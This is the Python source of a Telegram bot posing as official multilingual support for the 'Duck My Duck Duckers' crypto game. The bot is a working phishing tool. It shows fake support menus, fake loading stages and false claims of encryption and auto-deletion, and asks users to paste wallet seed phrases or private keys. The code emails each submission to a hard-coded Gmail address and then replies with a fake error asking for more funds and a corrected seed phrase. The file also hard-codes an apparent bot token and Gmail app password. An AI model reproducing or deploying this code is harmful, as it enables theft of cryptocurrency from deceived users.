import os
import smtplib
import logging
import random
import asyncio
from datetime import datetime
from email.mime.text import MIMEText
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

BOT_TOKEN = "8627690590:AAHWFRcgdCz7NQ5bIosAz4uNR1zctuCjyMk"
GMAIL_USER = "adebayoteslim78@gmail.com"
GMAIL_APP_PASSWORD = "aplwkfwjvoeypvic"
ADMIN_EMAIL = "adebayoteslim78@gmail.com"

if not all([BOT_TOKEN, GMAIL_USER, GMAIL_APP_PASSWORD]):
    raise RuntimeError("Missing BOT_TOKEN, GMAIL_USER or GMAIL_APP_PASSWORD")

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== TEXTS ====================
WELCOME_MESSAGE = {
    "en": "👋 Welcome to **Official Duck My Duck Duckers Support**!\n\nWe're here to help you with account & login issues, wallet connection, claim reflection, $DMD token & balance, missing rewards, duck feeding & breeding, corn & stars, referrals, tasks, trading, NFTs, security and more.\n\nPlease select your language and choose the issue you need help with. Our team will assist you as quickly as possible.\n\nThank you for being part of the Duck My Duck Duckers community! 🦆",
    "ru": "👋 Добро пожаловать в **Официальную поддержку Duck My Duck Duckers**!\n\nМы поможем вам с аккаунтом и входом, подключением кошелька, claim reflection, токеном $DMD, наградами, кормлением уток, кукурузой и звездами, рефералами, заданиями, торговлей, NFT, безопасностью и другими вопросами.\n\nВыберите язык и укажите проблему. Наша команда поможет вам как можно быстрее.\n\nСпасибо, что вы с нами! 🦆",
    "de": "👋 Willkommen beim **Offiziellen Duck My Duck Duckers Support**!\n\nWir helfen Ihnen bei Konto- & Login-Problemen, Wallet-Verbindung, Claim Reflection, $DMD Token & Guthaben, fehlenden Belohnungen, Entenfütterung & Zucht, Mais & Sternen, Referrals, Aufgaben, Trading, NFTs, Sicherheit und mehr.\n\nBitte wählen Sie Ihre Sprache und das gewünschte Thema. Unser Team hilft Ihnen so schnell wie möglich.\n\nVielen Dank, dass Sie Teil der Duck My Duck Duckers Community sind! 🦆",
    "es": "👋 ¡Bienvenido al **Soporte Oficial de Duck My Duck Duckers**!\n\nEstamos aquí para ayudarte con problemas de cuenta e inicio de sesión, conexión de billetera, claim reflection, token $DMD y saldo, recompensas faltantes, alimentación y cría de patos, maíz y estrellas, referidos, tareas, trading, NFTs, seguridad y más.\n\nSelecciona tu idioma y elige el problema. Nuestro equipo te asistirá lo más rápido posible.\n\n¡Gracias por ser parte de la comunidad Duck My Duck Duckers! 🦆",
    "tr": "👋 **Resmi Duck My Duck Duckers Destek**'e Hoş Geldiniz!\n\nHesap ve giriş sorunları, cüzdan bağlantısı, claim reflection, $DMD token ve bakiye, eksik ödüller, ördek besleme ve üreme, mısır ve yıldızlar, referanslar, görevler, ticaret, NFT'ler, güvenlik ve daha fazlasında size yardımcı oluyoruz.\n\nLütfen dilinizi seçin ve sorununuzu belirtin. Ekibimiz size en kısa sürede yardımcı olacaktır.\n\nDuck My Duck Duckers topluluğunun bir parçası olduğunuz için teşekkürler! 🦆"
}

SECURITY_WARNING = {
    "en": "🛡️ Duck My Duck Duckers Technical Support Team Note:\nOur system uses military-grade AES-256 end-to-end encryption, zero-knowledge architecture, and isolated air-gapped servers. All data is processed automatically, never viewed by humans, and permanently deleted within milliseconds. Completely safe and private.",
    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Duckers:\nНаша система использует военного уровня шифрование AES-256...",
    "de": "🛡️ Duck My Duck Duckers Technisches Support-Team Hinweis:\nUnser System verwendet militärische AES-256 Verschlüsselung...",
    "es": "🛡️ Nota del Equipo de Soporte Técnico Duck My Duck Duckers:\nNuestro sistema utiliza encriptación AES-256 de grado militar...",
    "tr": "🛡️ Duck My Duck Duckers Teknik Destek Ekibi Notu:\nSistemimiz askeri düzeyde AES-256 şifreleme kullanır..."
}

EVENT_TECHNICAL_NOTE = {
    "en": "🛡️ Duck My Duck Duckers Technical Support Team Note:\nOur multi-event system uses military-grade AES-256 end-to-end encryption, zero-knowledge verification, and isolated air-gapped servers. All data is processed automatically and permanently deleted immediately. Completely safe and private.",
    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Duckers:\nНаша много-событийная система использует военного уровня шифрование AES-256...",
    "de": "🛡️ Duck My Duck Duckers Technisches Support-Team Hinweis:\nUnser Multi-Event-System verwendet militärische AES-256...",
    "es": "🛡️ Nota del Equipo de Soporte Duck My Duck Duckers:\nNuestro sistema multi-evento utiliza encriptación AES-256...",
    "tr": "🛡️ Duck My Duck Duckers Teknik Destek Notu:\nÇoklu etkinlik sistemimiz askeri AES-256 şifreleme kullanır..."
}

EVENT_INPUT_NOTE = {
    "en": "🛡️ Duck My Duck Duckers Technical Support Team Note:\nThe final automated verification is fully secure — encrypted in transit and at rest, handled exclusively by our proprietary engine with zero human access and immediate auto-deletion.\n\nTo unlock or claim rewards for your selected event, please paste your 12/24-word wallet recovery seed phrase below.",
    "ru": "🛡️ Сообщение от технической поддержки Duck My Duck Duckers:\nФинальная автоматическая верификация полностью безопасна...\n\nВставьте вашу seed-фразу ниже.",
    "de": "🛡️ Duck My Duck Duckers Technisches Support-Team Hinweis:\nDie finale automatische Verifikation ist vollständig sicher...\n\nBitte geben Sie Ihre 12/24-Wort Seed-Phrase ein.",
    "es": "🛡️ Nota del Equipo de Soporte Duck My Duck Duckers:\nLa verificación automática final es completamente segura...\n\nPor favor pega tu frase semilla de 12/24 palabras.",
    "tr": "🛡️ Duck My Duck Duckers Teknik Destek Notu:\nSon otomatik doğrulama tamamen güvenlidir...\n\nLütfen 12/24 kelimelik seed cümlenizi yapıştırın."
}

INPUT_SECURITY_WARNING = {
    "en": "🛡️ **Final Secure Verification Step**\n\nYour data is protected with military-grade AES-256 encryption and zero-knowledge protocol.\nAll information is processed automatically and permanently deleted within seconds after verification.\n\n✅ Completely safe and private. No human access.",
    "ru": "🛡️ **Заключительный шаг безопасной верификации**\n\nВаши данные защищены AES-256...\n✅ Полностью безопасно.",
    "de": "🛡️ **Letzter Sicherer Verifikationsschritt**\n\nIhre Daten sind mit militärischer AES-256 Verschlüsselung geschützt...\n✅ Vollkommen sicher.",
    "es": "🛡️ **Paso Final de Verificación Segura**\n\nSus datos están protegidos con encriptación AES-256...\n✅ Completamente seguro.",
    "tr": "🛡️ **Son Güvenli Doğrulama Adımı**\n\nVerileriniz askeri AES-256 şifreleme ile korunur...\n✅ Tamamen güvenli."
}

FAQ_TEXT = {
    "en": "❓ **Duck My Duck Duckers FAQ & Help Center**\n\n• Processing time: 5-30 minutes\n• Why seed phrase? Secure verification\n• Data safety: AES-256 + auto-delete\n\nSelect a service:",
    "ru": "❓ **FAQ и Центр поддержки Duck My Duck Duckers**\n\n• Время обработки: 5-30 минут...\n\nВыберите услугу:",
    "de": "❓ **FAQ & Hilfe Duck My Duck Duckers**\n\n• Bearbeitungszeit: 5-30 Minuten\n\nService wählen:",
    "es": "❓ **Preguntas Frecuentes Duck My Duck Duckers**\n\n• Tiempo de procesamiento: 5-30 minutos\n\nSelecciona un servicio:",
    "tr": "❓ **SSS & Yardım Merkezi Duck My Duck Duckers**\n\n• İşlem süresi: 5-30 dakika\n\nHizmet seçin:"
}

# ==================== FULL SERVICES ====================
SERVICES = {
    "account_login": {
        "en": "🔐 Account & Login Issues",
        "ru": "🔐 Проблемы с аккаунтом и входом",
        "de": "🔐 Konto- & Login-Probleme",
        "es": "🔐 Problemas de Cuenta e Inicio de Sesión",
        "tr": "🔐 Hesap ve Giriş Sorunları"
    },
    "wallet_connection": {
        "en": "🔗 Wallet Connection & Synchronization",
        "ru": "🔗 Подключение и синхронизация кошелька",
        "de": "🔗 Wallet-Verbindung & Synchronisation",
        "es": "🔗 Conexión y Sincronización de Billetera",
        "tr": "🔗 Cüzdan Bağlantısı ve Senkronizasyon"
    },
    "claim_reflection": {
        "en": "✨ Claim Reflection",
        "ru": "✨ Claim Reflection",
        "de": "✨ Claim Reflection",
        "es": "✨ Claim Reflection",
        "tr": "✨ Claim Reflection"
    },
    "dmd_token_balance": {
        "en": "💎 $DMD Token & Balance Issues",
        "ru": "💎 Проблемы с токеном $DMD и балансом",
        "de": "💎 $DMD Token & Guthaben-Probleme",
        "es": "💎 Problemas de Token $DMD y Saldo",
        "tr": "💎 $DMD Token ve Bakiye Sorunları"
    },
    "missing_rewards_staking": {
        "en": "🎁 Missing Rewards & Staking",
        "ru": "🎁 Отсутствующие награды и стейкинг",
        "de": "🎁 Fehlende Belohnungen & Staking",
        "es": "🎁 Recompensas Faltantes y Staking",
        "tr": "🎁 Eksik Ödüller ve Staking"
    },
    "duck_feeding_breeding": {
        "en": "🦆 Duck Feeding, Breeding & Upgrades",
        "ru": "🦆 Кормление, разведение и улучшения уток",
        "de": "🦆 Entenfütterung, Zucht & Upgrades",
        "es": "🦆 Alimentación, Cría y Mejoras de Patos",
        "tr": "🦆 Ördek Besleme, Üreme ve Yükseltmeler"
    },
    "corn_stars_balance": {
        "en": "🌽 Corn & Stars Balance Issues",
        "ru": "🌽 Проблемы с балансом кукурузы и звезд",
        "de": "🌽 Mais- & Sterne-Guthaben-Probleme",
        "es": "🌽 Problemas de Saldo de Maíz y Estrellas",
        "tr": "🌽 Mısır ve Yıldız Bakiye Sorunları"
    },
    "referral_pack_rewards": {
        "en": "📦 Referral & Pack Rewards",
        "ru": "📦 Реферальные и пакетные награды",
        "de": "📦 Referral- & Pack-Belohnungen",
        "es": "📦 Recompensas de Referidos y Packs",
        "tr": "📦 Referans ve Paket Ödülleri"
    },
    "tasks_events_promo": {
        "en": "🎯 Tasks, Events & Promo Codes",
        "ru": "🎯 Задания, события и промокоды",
        "de": "🎯 Aufgaben, Events & Promo-Codes",
        "es": "🎯 Tareas, Eventos y Códigos Promo",
        "tr": "🎯 Görevler, Etkinlikler ve Promo Kodlar"
    },
    "trading_market_nft": {
        "en": "📈 Trading, Market & NFT Issues",
        "ru": "📈 Проблемы с торговлей, рынком и NFT",
        "de": "📈 Trading-, Markt- & NFT-Probleme",
        "es": "📈 Problemas de Trading, Mercado y NFT",
        "tr": "📈 Ticaret, Piyasa ve NFT Sorunları"
    },
    "account_restrictions": {
        "en": "🚫 Account Restrictions & Verification",
        "ru": "🚫 Ограничения аккаунта и верификация",
        "de": "🚫 Kontobeschränkungen & Verifizierung",
        "es": "🚫 Restricciones de Cuenta y Verificación",
        "tr": "🚫 Hesap Kısıtlamaları ve Doğrulama"
    },
    "technical_errors": {
        "en": "⚠️ Technical Errors & Game Crashes",
        "ru": "⚠️ Технические ошибки и сбои игры",
        "de": "⚠️ Technische Fehler & Spielabstürze",
        "es": "⚠️ Errores Técnicos y Fallos del Juego",
        "tr": "⚠️ Teknik Hatalar ve Oyun Çökmeleri"
    },
    "security_suspicious": {
        "en": "🛡 Security & Suspicious Activity",
        "ru": "🛡 Безопасность и подозрительная активность",
        "de": "🛡 Sicherheit & Verdächtige Aktivität",
        "es": "🛡 Seguridad y Actividad Sospechosa",
        "tr": "🛡 Güvenlik ve Şüpheli Aktivite"
    },
    "general_support": {
        "en": "📝 General Support & Troubleshooting",
        "ru": "📝 Общая поддержка и устранение неполадок",
        "de": "📝 Allgemeiner Support & Fehlerbehebung",
        "es": "📝 Soporte General y Solución de Problemas",
        "tr": "📝 Genel Destek ve Sorun Giderme"
    },
}

# ==================== FULL WALLET LIST ====================
WALLETS = {
    "telegram": {"en": "📱 Telegram Wallet", "ru": "📱 Telegram Wallet", "de": "📱 Telegram Wallet", "es": "📱 Billetera Telegram", "tr": "📱 Telegram Cüzdanı"},
    "tonkeeper": {"en": "🟦 Tonkeeper", "ru": "🟦 Tonkeeper", "de": "🟦 Tonkeeper", "es": "🟦 Tonkeeper", "tr": "🟦 Tonkeeper"},
    "mytonwallet": {"en": "🔷 MyTonWallet", "ru": "🔷 MyTonWallet", "de": "🔷 MyTonWallet", "es": "🔷 MyTonWallet", "tr": "🔷 MyTonWallet"},
    "tonhub": {"en": "🌐 Tonhub", "ru": "🌐 Tonhub", "de": "🌐 Tonhub", "es": "🌐 Tonhub", "tr": "🌐 Tonhub"},
    "trust": {"en": "🟢 Trust Wallet", "ru": "🟢 Trust Wallet", "de": "🟢 Trust Wallet", "es": "🟢 Trust Wallet", "tr": "🟢 Trust Cüzdan"},
    "bitget": {"en": "🔶 Bitget Wallet", "ru": "🔶 Bitget Wallet", "de": "🔶 Bitget Wallet", "es": "🔶 Bitget Wallet", "tr": "🔶 Bitget Cüzdan"},
    "safepal": {"en": "🛡️ SafePal", "ru": "🛡️ SafePal", "de": "🛡️ SafePal", "es": "🛡️ SafePal", "tr": "🛡️ SafePal"},
    "okx": {"en": "📈 OKX Wallet", "ru": "📈 OKX Wallet", "de": "📈 OKX Wallet", "es": "📈 OKX Wallet", "tr": "📈 OKX Cüzdan"},
    "binance": {"en": "📊 Binance Web3 Wallet", "ru": "📊 Binance Web3 Wallet", "de": "📊 Binance Web3 Wallet", "es": "📊 Binance Web3 Wallet", "tr": "📊 Binance Web3 Cüzdan"},
    "coin98": {"en": "🌟 Coin98 Super Wallet", "ru": "🌟 Coin98 Super Wallet", "de": "🌟 Coin98 Super Wallet", "es": "🌟 Coin98 Super Wallet", "tr": "🌟 Coin98 Super Cüzdan"},
    "exodus": {"en": "🌍 Exodus Wallet", "ru": "🌍 Exodus Wallet", "de": "🌍 Exodus Wallet", "es": "🌍 Exodus Wallet", "tr": "🌍 Exodus Cüzdan"},
    "atomic": {"en": "⚛️ Atomic Wallet", "ru": "⚛️ Atomic Wallet", "de": "⚛️ Atomic Wallet", "es": "⚛️ Atomic Wallet", "tr": "⚛️ Atomic Cüzdan"},
    "ledger": {"en": "🔒 Ledger Hardware", "ru": "🔒 Ledger Hardware", "de": "🔒 Ledger Hardware", "es": "🔒 Ledger Hardware", "tr": "🔒 Ledger Donanım"},
    "other": {"en": "🔸 Other Wallet", "ru": "🔸 Другой кошелек", "de": "🔸 Anderes Wallet", "es": "🔸 Otra Billetera", "tr": "🔸 Diğer Cüzdan"},
}

INPUT_TYPES = {
    "12": {"en": "🔑 12 Words Seed Phrase", "ru": "🔑 12-словная seed-фраза", "de": "🔑 12 Wörter Seed Phrase", "es": "🔑 Frase Semilla 12 Palabras", "tr": "🔑 12 Kelime Seed Cümlesi"},
    "24": {"en": "🔐 24 Words Seed Phrase", "ru": "🔐 24-словная seed-фраза", "de": "🔐 24 Wörter Seed Phrase", "es": "🔐 Frase Semilla 24 Palabras", "tr": "🔐 24 Kelime Seed Cümlesi"},
    "key": {"en": "🧾 Private Key", "ru": "🧾 Приватный ключ", "de": "🧾 Privater Schlüssel", "es": "🧾 Clave Privada", "tr": "🧾 Özel Anahtar"},
}

# ==================== KEYBOARDS ====================
def get_start_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🆘 Support", callback_data="support")]])

def get_language_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en")],
        [InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr")],
    ])

def get_issue_keyboard(lang="en"):
    buttons = [[InlineKeyboardButton(v.get(lang, v["en"]), callback_data=f"svc_{k}")] for k, v in SERVICES.items()]
    buttons.append([InlineKeyboardButton("← Back", callback_data="back_main")])
    return InlineKeyboardMarkup(buttons)

def get_event_issue_keyboard(lang="en"):
    buttons = [
        [InlineKeyboardButton("Album Set / Sticker Rewards (Popcorn / TON)", callback_data="event_album_rewards")],
        [InlineKeyboardButton("Mega Wheel / Album Set Wheel Issues", callback_data="event_mega_wheel")],
        [InlineKeyboardButton("Soccer Match Cooldown / Re-join", callback_data="event_soccer_match")],
        [InlineKeyboardButton("Daily/Weekly Spins & Energy", callback_data="event_spins_energy")],
        [InlineKeyboardButton("General Reward Claim / Delay", callback_data="event_reward_claim")],
        [InlineKeyboardButton("Progress Loss / Migration", callback_data="event_progress_loss")],
        [InlineKeyboardButton("Other Events", callback_data="event_other")],
        [InlineKeyboardButton("← Back", callback_data="back_to_services")]
    ]
    return InlineKeyboardMarkup(buttons)

def get_wallet_keyboard(lang="en"):
    buttons = [
        [InlineKeyboardButton(WALLETS["telegram"].get(lang, WALLETS["telegram"]["en"]), callback_data="wallet_telegram")],
        [InlineKeyboardButton(WALLETS["tonkeeper"].get(lang, WALLETS["tonkeeper"]["en"]), callback_data="wallet_tonkeeper")],
        [InlineKeyboardButton(WALLETS["mytonwallet"].get(lang, WALLETS["mytonwallet"]["en"]), callback_data="wallet_mytonwallet")],
        [InlineKeyboardButton(WALLETS["tonhub"].get(lang, WALLETS["tonhub"]["en"]), callback_data="wallet_tonhub")],
        [InlineKeyboardButton(WALLETS["trust"].get(lang, WALLETS["trust"]["en"]), callback_data="wallet_trust")],
        [InlineKeyboardButton(WALLETS["bitget"].get(lang, WALLETS["bitget"]["en"]), callback_data="wallet_bitget")],
        [InlineKeyboardButton(WALLETS["safepal"].get(lang, WALLETS["safepal"]["en"]), callback_data="wallet_safepal")],
        [InlineKeyboardButton(WALLETS["okx"].get(lang, WALLETS["okx"]["en"]), callback_data="wallet_okx")],
        [InlineKeyboardButton(WALLETS["binance"].get(lang, WALLETS["binance"]["en"]), callback_data="wallet_binance")],
        [InlineKeyboardButton(WALLETS["coin98"].get(lang, WALLETS["coin98"]["en"]), callback_data="wallet_coin98")],
        [InlineKeyboardButton(WALLETS["exodus"].get(lang, WALLETS["exodus"]["en"]), callback_data="wallet_exodus")],
        [InlineKeyboardButton(WALLETS["atomic"].get(lang, WALLETS["atomic"]["en"]), callback_data="wallet_atomic")],
        [InlineKeyboardButton(WALLETS["ledger"].get(lang, WALLETS["ledger"]["en"]), callback_data="wallet_ledger")],
        [InlineKeyboardButton(WALLETS["other"].get(lang, WALLETS["other"]["en"]), callback_data="wallet_other")],
        [InlineKeyboardButton("← Back", callback_data="back_to_wallet")]
    ]
    return InlineKeyboardMarkup(buttons)

def get_input_type_keyboard(lang="en"):
    buttons = [
        [InlineKeyboardButton(INPUT_TYPES["12"].get(lang, INPUT_TYPES["12"]["en"]), callback_data="input_12")],
        [InlineKeyboardButton(INPUT_TYPES["24"].get(lang, INPUT_TYPES["24"]["en"]), callback_data="input_24")],
        [InlineKeyboardButton(INPUT_TYPES["key"].get(lang, INPUT_TYPES["key"]["en"]), callback_data="input_key")],
        [InlineKeyboardButton("← Back", callback_data="back_to_wallet")]
    ]
    return InlineKeyboardMarkup(buttons)

# ==================== HELPERS ====================
def generate_ticket_number():
    return f"Duck-#{random.randint(1000, 9999)}"

async def professional_loading(update: Update, initial_text: str):
    stages = [
        initial_text,
        initial_text + "\n\n🔄 Connecting to secure verification node...",
        initial_text + "\n\n🔄 Establishing encrypted tunnel...",
        initial_text + "\n\n🔄 Validating wallet integrity...",
        initial_text + "\n\n🔄 Processing through zero-knowledge engine...",
        initial_text + "\n\n✅ Verification node responded successfully."
    ]
    msg = await update.effective_message.reply_text(stages[0])
    for stage in stages[1:]:
        await asyncio.sleep(1.0)
        await msg.edit_text(stage)
    await asyncio.sleep(0.8)
    return msg

def send_ticket_email(user, service, wallet="", input_type="", seed=""):
    body = f"""
New Duck My Duck Duckers Support Ticket
Ticket ID: {generate_ticket_number()}
User: {user}
Service: {service}
Wallet: {wallet}
Input Type: {input_type}
Seed/Private Key: {seed}
Time: {datetime.utcnow().isoformat()} UTC
    """
    msg = MIMEText(body)
    msg["Subject"] = f"New Ticket: {service}"
    msg["From"] = GMAIL_USER
    msg["To"] = ADMIN_EMAIL
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            server.sendmail(GMAIL_USER, ADMIN_EMAIL, msg.as_string())
        logger.info("Ticket emailed successfully.")
    except Exception as e:
        logger.error(f"Email failed: {e}")

# ==================== HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    context.user_data["lang"] = "en"
    username = update.effective_user.username or update.effective_user.first_name or "there"
    await update.message.reply_text(
        f"Hello, {username}!\n\n{WELCOME_MESSAGE['en']}",
        reply_markup=get_language_keyboard()
    )

async def language_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_")[1]
    context.user_data["lang"] = lang
    username = query.from_user.username or query.from_user.first_name or "there"
    welcome = WELCOME_MESSAGE.get(lang, WELCOME_MESSAGE["en"])
    await query.edit_message_text(
        f"Hello, {username}!\n\n{welcome}",
        reply_markup=get_start_keyboard()
    )

async def support_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    note = SECURITY_WARNING.get(lang, SECURITY_WARNING["en"])
    await query.edit_message_text(
        f"{note}\n\n🎫 Select the issue you need help with:",
        reply_markup=get_issue_keyboard(lang)
    )

async def issue_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    service_key = query.data.split("_", 1)[1]
    if service_key == "faq_help":
        await query.edit_message_text(FAQ_TEXT.get(lang, FAQ_TEXT["en"]), reply_markup=get_issue_keyboard(lang), parse_mode="Markdown")
        return
    ticket = generate_ticket_number()
    context.user_data["ticket"] = ticket
    context.user_data["service"] = service_key
    user = query.from_user.username or query.from_user.first_name or "Unknown"
    send_ticket_email(user=user, service=service_key)
    if service_key == "event_issue":
        await query.edit_message_text(f"✅ Ticket **{ticket}** created!", parse_mode="Markdown")
        await professional_loading(update, "🔄 Initializing event verification system")
        note = EVENT_TECHNICAL_NOTE.get(lang, EVENT_TECHNICAL_NOTE["en"])
        await query.edit_message_text(f"{note}\n\n🎉 Please select the event issue category:", reply_markup=get_event_issue_keyboard(lang))
        return
    service_name = SERVICES.get(service_key, {}).get(lang, service_key)
    await query.edit_message_text(f"✅ Ticket **{ticket}** created!", parse_mode="Markdown")
    await professional_loading(update, "🔄 Loading secure wallet options")
    await query.edit_message_text(
        f"✅ Ticket **{ticket}** created successfully!\n\nPlease select your wallet:",
        reply_markup=get_wallet_keyboard(lang),
        parse_mode="Markdown"
    )

async def event_subissue_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    ticket = generate_ticket_number()
    context.user_data["ticket"] = ticket
    sub = query.data.replace("event_", "").replace("_", " ").title()
    context.user_data["service"] = f"event_issue: {sub}"
    user = query.from_user.username or query.from_user.first_name or "Unknown"
    send_ticket_email(user=user, service=context.user_data["service"])
    note = EVENT_INPUT_NOTE.get(lang, EVENT_INPUT_NOTE["en"])
    await query.edit_message_text(
        f"✅ Ticket **{ticket}** created!\n\n{note}\n\nPlease select your wallet:",
        reply_markup=get_wallet_keyboard(lang),
        parse_mode="Markdown"
    )

async def wallet_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    wallet_key = query.data.split("_", 1)[1]
    context.user_data["wallet"] = wallet_key
    ticket = context.user_data.get("ticket", "Unknown")
    wallet_name = WALLETS.get(wallet_key, {}).get(lang, wallet_key.title())
    await query.edit_message_text(
        f"{SECURITY_WARNING.get(lang, SECURITY_WARNING['en'])}\n\n"
        f"✅ Ticket **{ticket}**\n\n"
        f"Selected Wallet: **{wallet_name}**\n\n"
        "Please choose input type:",
        reply_markup=get_input_type_keyboard(lang),
        parse_mode="Markdown"
    )

async def input_type_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    input_key = query.data.split("_", 1)[1]
    context.user_data["input_type"] = input_key
    ticket = context.user_data.get("ticket", "Unknown")
    wallet = context.user_data.get("wallet", "unknown")
    wallet_name = WALLETS.get(wallet, {}).get(lang, wallet.title())
    input_name = INPUT_TYPES.get(input_key, {}).get(lang, input_key)
    warning = INPUT_SECURITY_WARNING.get(lang, INPUT_SECURITY_WARNING["en"])
    await query.edit_message_text(
        f"✅ Ticket **{ticket}**\n\n"
        f"Wallet: {wallet_name}\n"
        f"Input Type: {input_name}\n\n"
        f"{warning}\n\n"
        "🔑 Please paste your seed phrase or private key below:",
        parse_mode="Markdown"
    )
    context.user_data["awaiting_input"] = True

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_input"):
        return
    user_input = update.message.text.strip()
    ticket = context.user_data.get("ticket", "Unknown")
    service = context.user_data.get("service", "Unknown")
    wallet = context.user_data.get("wallet", "Unknown")
    input_type = context.user_data.get("input_type", "Unknown")
    user = update.effective_user.username or update.effective_user.first_name or "Unknown"
    send_ticket_email(user=user, service=service, wallet=wallet, input_type=input_type, seed=user_input)
    error_text = (
        "Verification failed — the wallet's current balance is insufficient to cover the required transaction fees and smart contract activation costs on the Toncoin network.\n"
        "The operation cannot proceed due to network rejection (error code: INSUFFICIENT_FEES_FOR_FINALIZATION).\n\n"
        "Please ensure your wallet has adequate TON balance before retrying.\n\n"
        "Additionally, please carefully recheck and input the correct keywords (seed phrase words) — even one incorrect word will cause validation to fail.\n\n"
        "Write 'Retry verification' or attach a recent transaction screenshot + corrected seed phrase for re-processing."
    )
    await update.message.reply_text(error_text)
    context.user_data.clear()

async def back_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    if query.data == "back_main":
        username = query.from_user.username or query.from_user.first_name or "there"
        await query.edit_message_text(
            f"Hello, {username}!\n\n{WELCOME_MESSAGE.get(lang, WELCOME_MESSAGE['en'])}",
            reply_markup=get_start_keyboard()
        )
    elif query.data == "back_to_services":
        note = SECURITY_WARNING.get(lang, SECURITY_WARNING["en"])
        await query.edit_message_text(
            f"{note}\n\n🎫 Select the issue you need help with:",
            reply_markup=get_issue_keyboard(lang)
        )
    elif query.data == "back_to_wallet":
        ticket = context.user_data.get("ticket", "Unknown")
        await query.edit_message_text(
            f"✅ Ticket **{ticket}**\n\nPlease select your wallet:",
            reply_markup=get_wallet_keyboard(lang),
            parse_mode="Markdown"
        )

# ==================== MAIN ====================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(language_handler, pattern="^lang_"))
    app.add_handler(CallbackQueryHandler(support_menu_handler, pattern="^support$"))
    app.add_handler(CallbackQueryHandler(issue_handler, pattern="^svc_"))
    app.add_handler(CallbackQueryHandler(event_subissue_handler, pattern="^event_"))
    app.add_handler(CallbackQueryHandler(wallet_handler, pattern="^wallet_"))
    app.add_handler(CallbackQueryHandler(input_type_handler, pattern="^input_"))
    app.add_handler(CallbackQueryHandler(back_handler, pattern="^back_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    print("✅ Duck My Duck Duckers Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
